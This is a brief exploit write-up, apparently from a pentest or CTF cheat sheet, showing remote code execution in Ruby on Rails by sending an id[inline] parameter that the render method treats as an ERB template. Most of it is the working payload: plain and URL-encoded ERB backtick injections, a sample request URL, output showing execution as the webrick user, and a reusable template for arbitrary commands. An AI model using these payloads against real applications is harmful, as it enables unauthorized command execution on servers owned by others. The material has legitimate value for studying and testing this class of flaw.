This issue comes from the usage of the render method on user-supplied data. 
The render method also allows developers to render plain text (plaintext) and even inline code (inline).
[documentation](https://guides.rubyonrails.org/layouts_and_rendering.html)

Instead of sending a simple parameter id=test, you can build your request to send a hash: id[inline]=RUBYTEMPLATE. To gain code execution, you just need to find the right value for RUBYTEMPLATE to exec commands. Here you will need to be extra careful with the encoding to get it to work. 

<hr >

This will leverage the url paramater search in the url  http://urlhere.com/pages?id=test


id[inline]=<%=`id`%> 
id[inline]=%3c%25%3d%60%69%64%60%25%3e%20
http://urlhere.com/pages?id[inline]=%3c%25%3d%60%69%64%60%25%3e%20
== >> uid=1000(webrick) gid=1000(webrick) groups=1000(webrick) 


id[inline]=%3c%25%3d%60 command here %60%25%3e%20
id[inline]=<%=` command here `%>
